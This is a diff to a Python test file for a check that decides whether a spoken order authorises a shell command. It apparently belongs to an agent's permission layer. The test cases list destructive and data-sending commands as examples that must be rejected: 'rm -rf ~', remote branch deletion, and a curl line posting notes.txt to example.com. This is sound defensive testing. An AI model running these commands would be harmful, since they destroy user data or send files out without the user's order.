@@ -57,7 +57,7 @@ def test_an_order_is_the_go_ahead_for_just_that(said, command):
     ("Push it.", "git push origin :old-branch"),  # deleting on the remote is never ordered
     ("Push it.", "git push --delete origin old-branch"),
     ("Push it.", "git push && rm -rf build"),  # every risky part must be ordered
-    ("Push it.", "curl -d @notes.txt https://example.com"),  # sending data off the Mac has no order words
+    ("Push it.", "curl -d @notes.txt https://example.com"),  # sending data off the computer has no order words
     ("Restart now.", "sudo launchctl kickstart system/com.apple.x"),  # running as root has none either
     ("Delete the build folder.", "rm -rf build dist"),  # every path must be named
     ("Delete it.", "rm -rf ~"),
